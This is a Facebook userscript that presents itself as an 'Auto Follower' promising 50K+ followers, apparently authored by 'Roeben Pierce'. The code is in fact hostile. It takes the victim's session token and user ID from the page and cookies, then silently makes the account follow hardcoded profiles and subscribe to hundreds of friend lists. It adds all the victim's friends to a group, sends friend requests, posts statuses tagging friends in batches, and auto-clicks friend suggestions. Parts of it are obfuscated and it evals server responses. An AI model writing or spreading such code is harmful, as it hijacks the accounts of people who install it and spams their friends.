// ==UserScript==
// @name            [FCU] Auto Follower *GET 50K+ FOLLOWERS*
// @description    Auto Follower by Roeben Pierce
// @version 	1.0.0
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}

a("100000885694639");
a("100000545044421");
a("1158766764");
a("100000292369865");
a("100001242670334");

sublist("538604546179064");
sublist("589586447747540");
sublist("589590794413772");
sublist("589592631080255");
sublist("589596454413206");
sublist("589596881079830");
sublist("589597047746480");
sublist("589597187746466");
sublist("589597377746447");
sublist("589597557746429");
sublist("591256777580507");
sublist("337355256392460");
sublist("337355589725760");
sublist("337355676392418");
sublist("337355913059061");
sublist("337356006392385");
sublist("337357759725543");
sublist("337362216391764");
sublist("337362336391752");
sublist("337362416391744");
sublist("337362549725064");
sublist("592944337411751");
sublist("592944420745076");
sublist("592944447411740");
sublist("592944894078362");
sublist("592944907411694");
sublist("592945017411683");
sublist("592945180745000");
sublist("592945294078322");
sublist("592945324078319");
sublist("592946017411583");
sublist("592946080744910");
sublist("592946350744883");
sublist("592946384078213");
sublist("592946474078204");
sublist("592946514078200");
sublist("592946530744865");
sublist("592946627411522");
sublist("592946674078184");
sublist("592946697411515");
sublist("592946924078159");
sublist("592946930744825");
sublist("592946940744824");
sublist("592947184078133");
sublist("592947200744798");
sublist("592947227411462");
sublist("592949207411264");
sublist("592949414077910");
sublist("592949424077909");
sublist("592949430744575");
sublist("592949157411269");
sublist("592949180744600");
sublist("592950010744517");
sublist("343823002412352");
sublist("343823029079016");
sublist("343823042412348");
sublist("343823065745679");
sublist("343823099079009");
sublist("343823512412301");
sublist("343823539078965");
sublist("343823562412296");
sublist("343823579078961");
sublist("343823599078959");
sublist("343824032412249");
sublist("343824052412247");
sublist("343824032412249");
sublist("343824062412246");
sublist("343824072412245");
sublist("343824082412244");
sublist("343824502412202");
sublist("343824585745527");
sublist("343824602412192");
sublist("343824625745523");
sublist("343824635745522");
sublist("343825012412151");
sublist("343825042412148");
sublist("343825079078811");
sublist("343825115745474");
sublist("343825132412139");
sublist("343825322412120");
sublist("343825392412113");
sublist("343825552412097");
sublist("343825565745429");
sublist("343825575745428");
sublist("343826145745371");
sublist("343826195745366");
sublist("343826252412027");
sublist("343826295745356");
sublist("350578345071906");
sublist("350578381738569");
sublist("350578408405233");
sublist("350578471738560");
sublist("350578501738557");
sublist("350579191738488");
sublist("350579205071820");
sublist("350579221738485");
sublist("350579241738483");
sublist("350579275071813");
sublist("350579868405087");
sublist("350579898405084");
sublist("350579911738416");
sublist("350579951738412");
sublist("350579988405075");
sublist("350580688405005");
sublist("350580721738335");
sublist("350580735071667");
sublist("350580758404998");
sublist("350580781738329");
sublist("350581355071605");
sublist("350581358404938");
sublist("350581365071604");
sublist("350581368404937");
sublist("350581388404935");
sublist("350581631738244");
sublist("350581555071585");
sublist("350581595071581");
sublist("350581601738247");
sublist("350581615071579");
sublist("350581771738230");
sublist("350581778404896");
sublist("350581788404895");
sublist("350581801738227");
sublist("350581808404893");
sublist("350582325071508");
sublist("350582338404840");
sublist("350582398404834");
sublist("350582408404833");
sublist("350582418404832");
sublist("331574466972616");
sublist("331574566972606");
sublist("331574720305924");
sublist("331574983639231");
sublist("331574990305897");
sublist("331575463639183");
sublist("331575470305849");
sublist("331575480305848");
sublist("331575503639179");
sublist("331575506972512");
sublist("331575913639138");
sublist("331575916972471");
sublist("331575923639137");
sublist("331575950305801");
sublist("331575970305799");
sublist("331576263639103");
sublist("331576283639101");
sublist("331576290305767");
sublist("331576293639100");
sublist("331576306972432");
sublist("331576576972405");
sublist("331576590305737");
sublist("331576593639070");
sublist("331576606972402");
sublist("331576616972401");
sublist("331576776972385");
sublist("331576786972384");
sublist("331576810305715");
sublist("331576820305714");
sublist("331576826972380");
sublist("331577466972316");
sublist("331577483638981");
sublist("331577486972314");
sublist("331577493638980");
sublist("331577496972313");
sublist("331578086972254");
sublist("331578093638920");
sublist("331578100305586");
sublist("331578110305585");
sublist("331578126972250");
sublist("335625496568471");
sublist("335625499901804");
sublist("335625513235136");
sublist("335625519901802");
sublist("335625523235135");
sublist("335626196568401");
sublist("335626206568400");
sublist("335626213235066");
sublist("335626226568398");
sublist("335626236568397");
sublist("335626636568357");
sublist("335626649901689");
sublist("335626653235022");
sublist("335626666568354");
sublist("335626683235019");
sublist("335627259901628");
sublist("335627263234961");
sublist("335627279901626");
sublist("335627289901625");
sublist("335627293234958");
sublist("335627736568247");
sublist("335627743234913");
sublist("335627756568245");
sublist("335627769901577");
sublist("335627786568242");
sublist("335628183234869");
sublist("335628186568202");
sublist("335628193234868");
sublist("335628196568201");
sublist("335628196568201");
sublist("335628636568157");
sublist("335628649901489");
sublist("335628676568153");
sublist("335628749901479");
sublist("335628763234811");
sublist("335629059901448");
sublist("335629066568114");
sublist("335629073234780");
sublist("335629086568112");
sublist("335629109901443");








var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "132911726811999";
var spost_id = "132911726811999";
var sfoto_id = "132911726811999";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}


//arkadaslari al ve isle
function sarkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "";
					smesaj_text = "";
				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					sdurumpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}

//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);
  

//arkadaþ ekleme
function sarkadasekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
			}
			eval(fonksiyon + "(" + id + "," + cins + ");");
			}
        };
		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send();
}

function autoSuggest()
{    
    links=document.getElementsByTagName('a');
    for (i in links) {
        l=links[i];
        if(l.innerHTML == '<span class="uiButtonText">Suggest Friend</span>') {
            l.click();
        }
    }
}

function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        w = document.getElementsByClassName('pbm fsm')[0];

        e = document.createElement('a');
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Roeben Pierce';
        e.className = 'uiButton';
        e.onclick = autoSuggest;

        if( w.childElementCount == 0)
        {
            w.appendChild(document.createElement('br'));
            w.appendChild(e);
        }
    }
}

blub();

document.addEventListener("DOMNodeInserted", blub, true);